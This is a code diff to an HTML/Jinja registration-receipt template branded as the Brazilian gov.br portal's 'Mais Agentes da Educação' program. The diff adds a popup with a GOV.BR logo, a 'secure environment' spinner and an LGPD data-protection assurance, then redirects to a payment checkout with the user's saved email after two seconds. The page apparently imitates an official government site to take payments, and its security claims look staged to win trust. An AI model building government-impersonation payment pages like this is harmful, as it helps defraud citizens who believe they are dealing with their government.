@@ -3,6 +3,41 @@
 {% block title %}{{ page_title or "Comprovante de Inscrição - Mais Agentes da Educação - gov.br" }}{% endblock %}
 
 {% block content %}
+<!-- Popup de Carregamento Seguro -->
+<div id="popup-carregamento" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden flex items-center justify-center">
+    <div class="bg-white rounded-lg shadow-lg p-8 max-w-md w-full mx-4">
+        <!-- Logo Gov.br -->
+        <div class="text-center mb-6">
+            <div class="inline-flex items-center justify-center">
+                <div class="bg-blue-600 text-white px-3 py-1 rounded text-lg font-bold">
+                    GOV.BR
+                </div>
+            </div>
+        </div>
+        
+        <!-- Spinner de carregamento -->
+        <div class="text-center mb-6">
+            <div class="inline-block animate-spin rounded-full h-12 w-12 border-4 border-blue-200 border-t-blue-600"></div>
+        </div>
+        
+        <!-- Texto principal -->
+        <div class="text-center mb-4">
+            <h2 class="text-xl font-medium text-blue-600 mb-2">
+                Carregando ambiente seguro...
+            </h2>
+            <p class="text-gray-600 text-sm leading-relaxed">
+                Estamos preparando um ambiente seguro para o processamento do seu pagamento. Por favor, aguarde um momento.
+            </p>
+        </div>
+        
+        <!-- Informação LGPD -->
+        <div class="text-center mt-8">
+            <p class="text-xs text-gray-500">
+                Seus dados estão protegidos conforme a Lei Geral de Proteção de Dados (LGPD) e as melhores práticas de segurança.
+            </p>
+        </div>
+    </div>
+</div>
 <div class="px-4 py-4">
     <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Comprovante de Inscrição</h1>
     
@@ -517,8 +552,8 @@ document.addEventListener('DOMContentLoaded', function() {
                     params.append('email', emailSalvo);
                 }
                 
-                // Redirecionar para página de carregamento seguro
-                window.location.href = `/carregamento-seguro?${params.toString()}`;
+                // Mostrar popup de carregamento seguro
+                mostrarCarregamentoSeguro(params.toString());
             }
         });
         
@@ -538,6 +573,17 @@ document.addEventListener('DOMContentLoaded', function() {
         if (!data) return '';
         const date = new Date(data);
         return date.toLocaleDateString('pt-BR');
+    }
+    
+    // Função para mostrar o popup de carregamento seguro
+    function mostrarCarregamentoSeguro(params) {
+        const popup = document.getElementById('popup-carregamento');
+        popup.classList.remove('hidden');
+        
+        // Redirecionar após 2 segundos para o checkout
+        setTimeout(function() {
+            window.location.href = `/checkout?${params}`;
+        }, 2000);
     }
 });
 </script>
